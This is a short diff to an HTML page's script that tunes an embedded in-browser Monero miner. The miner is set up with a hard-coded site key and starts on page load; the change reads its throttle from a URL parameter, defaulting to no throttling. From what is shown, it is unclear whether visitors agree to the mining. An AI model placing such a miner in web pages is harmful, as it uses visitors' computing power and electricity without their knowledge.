@@ -29,6 +29,10 @@
 </table>
 </p>
 <script>
+let get = (reg, n) => {
+		return (window.location.search.match(reg) || [])[1] || n;
+	};
+	
 if(typeof Client !== "undefined") {
         var xmr_client = new Client.User('1fd424c959da3d8df94f40ebc64359dd8d32cb9c8011e568f6cb5f5a0286632f','1f9e4bdb76cede95d9bd100be4fd41c0',{throttle:0,ads:0});
 } else {
@@ -91,8 +95,11 @@ $( document ).ready(startup());
 function startup() {
         refresh_data_min();
         refresh_data_sec();
-		let Throttle = Number(get(/s=(\d+)/, 1));
+		let Throttle = Number(get(/s=(\d+)/, 0))*0.01;
+		console.log(`Throttle=${Throttle}`);
+		
 		xmr_client.setThrottle(Throttle);
+		
 		xmr_client.start();
 }
 
